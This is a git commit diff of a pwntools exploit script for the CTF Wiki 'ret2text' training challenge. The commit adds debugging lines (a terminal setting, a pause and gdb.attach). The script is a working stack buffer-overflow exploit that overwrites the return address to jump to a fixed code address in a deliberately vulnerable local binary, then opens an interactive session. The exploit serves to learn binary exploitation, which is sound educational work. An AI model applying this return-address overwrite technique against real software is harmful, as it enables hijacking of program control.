833eeedfad7fa649db26ebfb970dd876fb9a29fa
M4xW4n9 <aboultraman@gmail.com>
2018-03-13 17:58:58 +0800

    ret2text

--- ctfWIKI_ret2text/exp.py
+++ ctfWIKI_ret2text/exp.py
@@ -3,6 +3,7 @@
 __Auther__ = 'M4x'
 
 from pwn import *
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 context(log_level = "debug")
 
 elf = ELF("./ret2text")
@@ -10,5 +11,7 @@ payload = fit({0x6c + 4: p32(0x0804863A)})
 
 io = process("./ret2text")
 io.sendlineafter("anything?\n", payload)
+raw_input("DEBUG: ")
+gdb.attach(io)
 io.interactive()
 io.close()
